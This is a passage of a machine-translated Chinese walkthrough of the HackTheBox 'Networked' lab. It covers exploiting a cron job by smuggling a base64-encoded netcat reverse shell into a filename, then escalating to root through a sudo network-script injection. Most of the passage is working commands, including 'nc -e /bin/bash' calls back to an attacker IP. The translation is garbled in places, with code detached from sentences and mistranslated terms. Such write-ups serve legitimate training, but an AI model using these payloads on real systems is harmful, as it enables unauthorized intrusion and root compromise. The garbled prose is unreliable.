`$path`静态设置在文件顶部。但事实并非如此。我会再次打开一个外壳，看看发生了什么。它首先读取目录中的所有文件，并使用 选择不以 开头的文件。我可以在我的目录中使用站点源和测试文件执行类似操作：`$value``php``uploads``preg_grep``.`

    root@kali# ls -a
    .  ..  index.php  lib.php  photos.php  .test  upload.php
    

    php > $files = preg_grep('/^([^.])/', scandir('.')); print_r($files);
    Array
    (
        [5] => index.php
        [6] => lib.php
        [7] => photos.php
        [8] => upload.php
    )
    

现在有一个数字存储为，文件名存储为 .`foreach``$files``$key``$value`

`$value`传递给 ，并将结果 传递给 ：`getnameCheck()``$name``$value``check_ip()`

    list ($name,$ext) = getnameCheck($value);
    $check = check_ip($name,$value);
    

如果为 false，代码将到达目标行。`$check[0]`

在 中，只是运行通过 ，它使用[FILTER\_VALIDATE\_IP](https://www.w3schools.com/php/filter_validate_ip.asp)来检查有效的 IP 地址。与上面完全相同，将是第一个之前的任何东西。`lib.php``check_ip``$name``filter_var``getnameCheck()``getnameUpload()``$name``.`

这意味着我在目录中写入的任何未命名为有效IP的文件都将传递到我可以注入的部分。`uploads`

### 外壳问题

这个盒子上的贝壳我们有点烦人。这是一个很好的例子，记住在尝试让其他用户的进程运行它之前，总是尝试自己运行shell。一旦我确定我有一个shell，当我运行它时，我可以对 privesc 使用相同的命令。

例如，我想让古利跑步。这应该有效，就像我的道路一样。但它失败了：`nc -e sh 10.10.14.7 443``sh`

    bash-4.2$ nc -e sh 10.10.14.7 443                                           
    exec: No such file or directory
    

在我的听众上，我看到连接，然后它立即死亡：

    root@kali# nc -lnvp 443
    Ncat: Version 7.70 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.146.
    Ncat: Connection from 10.10.10.146:57708.
    root@kali#
    

所以我测试了更多的贝壳作为阿帕奇。这个效果很好。我 base64 对我想运行的内容进行了编码：

    root@kali# echo nc -e /bin/bash 10.10.14.7 443 | base64 -w0
    bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE0LjcgNDQzCg==
    

现在从阿帕奇我可以运行：

    bash-4.2$ echo bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE0LjcgNDQzCg== | base64 -d | sh
    

我得到了一个稳定的回调：

    root@kali# nc -lnvp 443
    Ncat: Version 7.70 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.146.
    Ncat: Connection from 10.10.10.146:57710.
    id
    uid=48(apache) gid=48(apache) groups=48(apache)
    

### 获取外壳

把这些放在一起，我将触摸一个将获得shell的文件：

    bash-4.2$ touch '/var/www/html/uploads/a; echo bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE0LjcgNDQzCg== | base64 -d | sh; b'
    bash-4.2$ ls
    10_10_14_5.php.png
    127_0_0_1.png
    127_0_0_2.png
    127_0_0_3.png
    127_0_0_4.png
    a; echo bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE0LjcgNDQzCg== | base64 -d | sh; b
    index.html
    

当脚本运行时，它将遍历文件，当它在我的文件上运行时，它将设置为并运行：`$value``a; echo bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE0LjcgNDQzCg== | base64 -d | sh; b`

    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    

这意味着它将运行：

    exec("nohup /bin/rm -f /var/www/html/uploads/a; echo bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE0LjcgNDQzCg== | base64 -d | sh; b > /dev/null 2>&1 &");
    

一旦时钟达到可被三整除的一分钟，我就得到一个外壳：

    root@kali# nc -lnvp 443
    Ncat: Version 7.70 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.146.
    Ncat: Connection from 10.10.10.146:57712.
    id
    uid=1000(guly) gid=1000(guly) groups=1000(guly)
    

我还会确保清理我的文件：

    bash-4.2$ rm a*
    

作为古利，我可以抓住：`user.txt`

    [guly@networked ~]$ cat user.txt 
    526cfc23...
    

## Privesc 到 root

### 列举

`sudo -l`（我在任何Linux主机上检查的第一件事）告诉我，guly可以在没有密码的情况下以root身份运行shell脚本：

    [guly@networked ~]$ sudo -l
    sudo -l
    Matching Defaults entries for guly on networked:
        !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
        env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
        env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
        env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
        env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
        env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
        secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
    
    User guly may run the following commands on networked:
        (root) NOPASSWD: /usr/local/sbin/changename.sh
    

此脚本正在编写一个 ifcfg 脚本：

    #!/bin/bash -p
    cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
    DEVICE=guly0
    ONBOOT=no
    NM_CONTROLLED=no
    EoF
    
    regexp="^[a-zA-Z0-9_\ /-]+$"
    
    for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
            echo "interface $var:"
            read x
            while [[ ! $x =~ $regexp ]]; do
                    echo "wrong input, try again"
                    echo "interface $var:"
                    read x
            done
            echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
    done
      
    /sbin/ifup guly0
    

生成的脚本 （） 将在启动接口时运行。`ifcft-guly`

如果我运行 ，它会提示我输入几个变量，并将文件写出到 。它也无法加载设备，因为它不存在：`changename.sh``/etc/sysconfig/network-scripts/ifcfg-guly``guly0`

    [guly@networked ~]$ sudo /usr/local/sbin/changename.sh
    sudo /usr/local/sbin/changename.sh
    interface NAME:
    0xdf
    interface PROXY_METHOD:
    notamethod
    interface BROWSER_ONLY:
    yes
    interface BOOTPROTO:
    pineapple
    ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
    

但是 ifcfg 文件确实写了：

    [guly@networked ~]$ cat /etc/sysconfig/network-scripts/ifcfg-guly
    cat /etc/sysconfig/network-scripts/ifcfg-guly
    DEVICE=guly0
    ONBOOT=no
    NM_CONTROLLED=no
    NAME=0xdf
    PROXY_METHOD=notamethod
    BROWSER_ONLY=yes
    BOOTPROTO=pineapple
    

我再次运行它，并给出了一些有趣的答案，并收到了一些奇怪的消息：`command not found`

    [guly@networked ~]$ sudo /usr/local/sbin/changename.sh
    interface NAME:
    0xdf
    interface PROXY_METHOD:
    not a method
    interface BROWSER_ONLY:
    no thanks
    interface BOOTPROTO:
    yes
    /etc/sysconfig/network-scripts/ifcfg-guly: line 5: a: command not found
    /etc/sysconfig/network-scripts/ifcfg-guly: line 6: thanks: command not found
    /etc/sysconfig/network-scripts/ifcfg-guly: line 5: a: command not found
    /etc/sysconfig/network-scripts/ifcfg-guly: line 6: thanks: command not found
    ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
    

两次它试图运行和.这些是我输入中的文字。我将尝试使用命令：`a``thanks`

    [guly@networked ~]$ sudo /usr/local/sbin/changename.sh
    interface NAME:
    a id
    interface PROXY_METHOD:
    a ls /root/
    interface BROWSER_ONLY:
    a pwd
    interface BOOTPROTO:
    a whoami
    uid=0(root) gid=0(root) groups=0(root)
    root.txt
    /etc/sysconfig/network-scripts
    root
    uid=0(root) gid=0(root) groups=0(root)
    root.txt
    /etc/sysconfig/network-scripts
    root
    ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
    

### 壳

我偶然发现的是四月份在[保密名单上](https://seclists.org/fulldisclosure/2019/Apr/24)报告的错误。将执行网络脚本中值中空格之后的任何内容（格式为格式）。对[该披露的回应](https://seclists.org/fulldisclosure/2019/Apr/27)是，任何可以编写该文件的人基本上都是root，所以这并不重要。`VARIABLE=value`

脚本开头的正则表达式检查可以防止我做任何太复杂的事情，但它不会阻止我得到一个简单的shell：

    [guly@networked ~]$ sudo /usr/local/sbin/changename.sh
    interface NAME:
    0xdf
    interface PROXY_METHOD:
    a /bin/bash
    interface BROWSER_ONLY:
    b
    interface BOOTPROTO:
    c
    [root@networked network-scripts]# id 
    uid=0(root) gid=0(root) groups=0(root)
    

我现在可以抓住：`root.txt`

    [root@networked ~]# cat root.txt 
    0a8ecda8...
    

## 超越根 - PHP 配置错误

在获得最初的立足点时，我上传了一个文件，Web服务器将其视为PHP代码并运行它。我之前分享了[这个链接](https://blog.remirepo.net/post/2013/01/13/PHP-and-Apache-SetHandler-vs-AddHandler)。我想看看Apache配置，看看它与本文中的配置相比如何。`10_10_14_5.php.png`

阿帕奇配置文件存储在.主要配置是 ，但最后一行是：`/etc/httpd/``/etc/httpd/conf/httpd.conf`

    # Supplemental configuration
    #
    # Load config files in the "/etc/httpd/conf.d" directory, if any.
    IncludeOptional conf.d/*.conf
    

在里面，我会找到一些文件，包括：`/etc/http/conf.d``.conf`

    [root@networked ~]# ls /etc/httpd/conf.d/
    autoindex.conf  php.conf  README  userdir.conf  welcome.conf
    

查看 ，我将从博客文章中看到相同的配置：`php.cong`

    [root@networked ~]# cat /etc/httpd/conf.d/php.conf 
    AddHandler php5-script .php
    AddType text/html .php
    DirectoryIndex index.php
    php_value session.save_handler "files"
    php_value session.save_path    "/var/lib/php/session"
    

我可以看到 ，它将在每一侧都有隐含的通配符，因此它将在文件名中的任何位置匹配。`AddHander``.php``.php`

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2019/11/16/htb-networked.html)